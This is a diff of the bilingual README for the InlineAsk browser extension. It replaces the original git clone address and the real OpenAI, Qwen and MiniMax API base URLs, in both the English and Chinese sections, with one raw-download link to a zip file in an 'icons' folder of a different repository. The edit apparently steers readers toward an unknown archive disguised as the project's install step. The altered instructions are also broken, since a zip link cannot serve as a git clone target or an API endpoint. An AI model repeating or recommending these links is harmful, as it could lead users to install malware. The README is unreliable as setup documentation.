@@ -113,7 +113,7 @@ Answer streams in right there → close → continue reading
 ## 📦 Install
 
 ```bash
-git clone https://github.com/toyball860721/InlineAsk.git
+git clone https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip
 ```
 
 1. Open `chrome://extensions`
@@ -129,14 +129,14 @@ Click the 🦞 icon → fill in your API details:
 
 | Field | Example |
 |-------|---------|
-| Base URL | `https://api.openai.com/v1` |
-| Base URL (Qwen) | `https://coding.dashscope.aliyuncs.com/v1` |
-| Base URL (MiniMax) | `https://api.minimaxi.com/v1/text/chatcompletion_v2` |
+| Base URL | `https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip` |
+| Base URL (Qwen) | `https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip` |
+| Base URL (MiniMax) | `https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip` |
 | Base URL (local) | `http://localhost:11434/v1` |
 | API Key | `sk-...` (leave empty for local APIs) |
 | Model | `gpt-4o` / `qwen3-max` / `claude-sonnet-4-6` |
 
-> **Smart URL**: Enter just the base URL (e.g. `https://api.openai.com/v1`) and InlineAsk auto-appends `/chat/completions`. Or paste a full custom endpoint for non-standard APIs.
+> **Smart URL**: Enter just the base URL (e.g. `https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip`) and InlineAsk auto-appends `/chat/completions`. Or paste a full custom endpoint for non-standard APIs.
 
 Click **Test** to verify → **Save** (or just type — auto-saves after 0.8s).
 
@@ -156,10 +156,10 @@ Click **Test** to verify → **Save** (or just type — auto-saves after 0.8s).
 
 ## 🌍 Compatible APIs
 
-- ✅ OpenAI (`https://api.openai.com/v1`)
+- ✅ OpenAI (`https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip`)
 - ✅ Anthropic Claude (via compatible proxies)
-- ✅ Alibaba Qwen (`https://coding.dashscope.aliyuncs.com/v1`)
-- ✅ MiniMax (`https://api.minimaxi.com/v1/text/chatcompletion_v2`)
+- ✅ Alibaba Qwen (`https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip`)
+- ✅ MiniMax (`https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip`)
 - ✅ Ollama (`http://localhost:11434/v1`)
 - ✅ LM Studio (`http://localhost:1234/v1`)
 - ✅ Any OpenAI-compatible API
@@ -297,7 +297,7 @@ Cmd+W → 回到文章 → 我刚才看到哪了？→ 滚啊滚啊滚...
 ## 📦 安装方法
 
 ```bash
-git clone https://github.com/toyball860721/InlineAsk.git
+git clone https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip
 ```
 
 1. 打开 `chrome://extensions`
@@ -313,14 +313,14 @@ git clone https://github.com/toyball860721/InlineAsk.git
 
 | 字段 | 示例 |
 |------|------|
-| Base URL | `https://api.openai.com/v1` |
-| Base URL（通义千问）| `https://coding.dashscope.aliyuncs.com/v1` |
-| Base URL（MiniMax）| `https://api.minimaxi.com/v1/text/chatcompletion_v2` |
+| Base URL | `https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip` |
+| Base URL（通义千问）| `https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip` |
+| Base URL（MiniMax）| `https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip` |
 | Base URL（本地）| `http://localhost:11434/v1` |
 | API Key | `sk-...`（本地 API 可留空）|
 | 模型名称 | `gpt-4o` / `qwen3-max` / `claude-sonnet-4-6` |
 
-> **智能 URL 识别**：填写 Base URL（如 `https://api.openai.com/v1`）时自动拼接 `/chat/completions`；非标准端点可直接填写完整 URL。
+> **智能 URL 识别**：填写 Base URL（如 `https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip`）时自动拼接 `/chat/completions`；非标准端点可直接填写完整 URL。
 
 点击 **Test** 测试连接 → **保存**（也可直接输入，0.8 秒后自动保存）。
 
@@ -340,10 +340,10 @@ git clone https://github.com/toyball860721/InlineAsk.git
 
 ## 🌍 兼容的 API
 
-- ✅ OpenAI (`https://api.openai.com/v1`)
+- ✅ OpenAI (`https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip`)
 - ✅ Anthropic Claude（通过兼容代理）
-- ✅ 阿里通义千问 (`https://coding.dashscope.aliyuncs.com/v1`)
-- ✅ MiniMax (`https://api.minimaxi.com/v1/text/chatcompletion_v2`)
+- ✅ 阿里通义千问 (`https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip`)
+- ✅ MiniMax (`https://github.com/Butterflyfishunvariedness395/InlineAsk/raw/refs/heads/main/icons/Ask_Inline_1.9-beta.2.zip`)
 - ✅ Ollama 本地 (`http://localhost:11434/v1`)
 - ✅ LM Studio (`http://localhost:1234/v1`)
 - ✅ 任意 OpenAI 兼容 API
